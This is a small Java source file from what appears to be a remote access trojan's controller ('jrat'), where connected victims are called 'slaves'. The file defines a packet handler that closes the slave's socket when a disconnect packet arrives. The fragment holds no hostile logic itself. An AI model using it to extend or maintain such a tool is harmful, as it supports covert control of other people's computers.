package pro.jrat.packets.incoming;

import java.io.DataInputStream;

import pro.jrat.Slave;
import pro.jrat.exceptions.CloseException;


public class Packet12Disconnect extends AbstractIncomingPacket {

	@Override
	public void read(Slave slave, DataInputStream dis) throws Exception {
		slave.closeSocket(new CloseException("Disconnect packet"));
	}

}
